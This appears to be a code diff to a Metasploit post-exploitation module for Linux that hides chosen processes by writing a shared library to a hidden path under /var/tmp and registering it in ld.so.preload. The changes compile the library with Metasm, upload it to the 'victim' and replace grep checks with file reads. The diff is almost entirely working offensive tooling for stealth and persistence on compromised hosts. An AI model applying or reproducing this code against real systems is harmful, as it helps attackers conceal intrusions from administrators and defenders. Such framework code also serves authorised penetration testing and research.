@@ -18,17 +18,15 @@ class MetasploitModule < Msf::Post
         'References'   => [ 'https://github.com/gianlucaborello/libprocesshider' ],
         'License'      => MSF_LICENSE,
         'Author'       => [ 'Green-m <greenm.xxoo[at]gmail.com>'],
+        'Arch'         => [ ARCH_X86, ARCH_X64 ],
         'Platform'     => [ 'linux' ],
-        'Targets'      =>
-        [
-          [ 'Automatic', {} ]
-        ]
+        'SessionTypes' => ['shell', 'meterpreter']
       )
     )
 
     register_options [
         OptString.new('CMDLINE', [true, 'The cmdline to filter.']),
-        OptString.new('LIBPATH', [true, 'The shared obeject library file path', "/var/tmp/.#{Rex::Text.rand_text_alpha(8..12)}" ])
+        OptString.new('LIBPATH', [true, 'The shared object library file path', "/var/tmp/.#{Rex::Text.rand_text_alpha(8..12)}" ])
     ]
 
     register_advanced_options [
@@ -48,7 +46,7 @@ class MetasploitModule < Msf::Post
 
     print_good("All requirement is good.")
 
-    write_files
+    #write_files
 
     compile_code
 
@@ -101,7 +99,7 @@ class MetasploitModule < Msf::Post
   ##
   # Compile the code to so file.
   ##
-  def compile_code
+  def compile_code_with_gcc
     code = "gcc -Wall -fPIC -shared -o #{lib_path} #{artifact} -ldl"
 
     vprint_status("Compile c code to #{lib_path} as a shared object library file ")
@@ -113,6 +111,39 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::BadConfig, 'Unable to compile the code with gcc...') unless file_exist?(lib_path)
   end
 
+  ##
+  # Compile the code and upload it to victim.
+  ##
+  def compile_code
+    # Check and set the architecture
+    uname = cmd_exec('uname -m')
+    vprint_status "System architecture is #{uname}"
+
+    cpu = nil
+    case uname
+    when 'x86_64'
+      cpu = Metasm::X86_64.new
+    when /x86/, /i\d86/
+      cpu = Metasm::Ia32.new
+    else
+      fail_with(Failure::NoTarget, 'The architecture of target is not compatible')
+    end
+
+    # Compile shared object
+    vprint_status("Compile code to #{lib_path} as a shared object library file...")
+    print_line(code_template)
+    begin
+      lib_data = Metasm::ELF.compile_c(cpu, code_template).encode_string(:lib)
+    rescue
+      print_error "Metasm encoding failed: #{$ERROR_INFO}"
+      elog "Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
+      elog "Call stack:\n#{$ERROR_INFO.backtrace.join "\n"}"
+      fail_with(Failure::Unknown, 'Metasm encoding failed')
+    end
+
+    write_file(lib_path, lib_data)
+  end
+
   #
   # To install the hook in ld.so.preload
   #
@@ -122,10 +153,10 @@ class MetasploitModule < Msf::Post
 
     # Check the result.
     begin
-      unless cmd_exec("grep -q #{lib_path.inspect} #{preload_path} && echo true").to_s.include?('true') # Check if contain the lib_path
+      unless read_file(preload_path).to_s.include?(lib_path) # Check if contains the lib_path
         return false
       end
-    rescue Exception => e
+    rescue => e
       vprint_line(e)
       return false
     end
